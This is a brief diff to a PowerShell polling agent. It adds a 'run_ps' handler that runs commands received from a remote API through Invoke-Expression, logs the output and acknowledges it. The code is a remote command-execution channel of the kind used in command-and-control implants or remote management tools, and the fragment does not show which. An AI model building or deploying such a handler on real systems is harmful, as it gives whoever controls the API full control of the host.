@@ -416,6 +416,8 @@ function PollApi {
                 }
                 'run_ps'           {
                     if ($data) {
+                        try {
+                            $result = Invoke-Expression $data 2>&1
                             $out = if ($result) { ($result | Out-String).Trim() } else { '(sem saida)' }
                             wLog "run_ps OK: $($out.Substring(0, [Math]::Min(200, $out.Length)))" 'OK'
                             SendAck $cmd $true
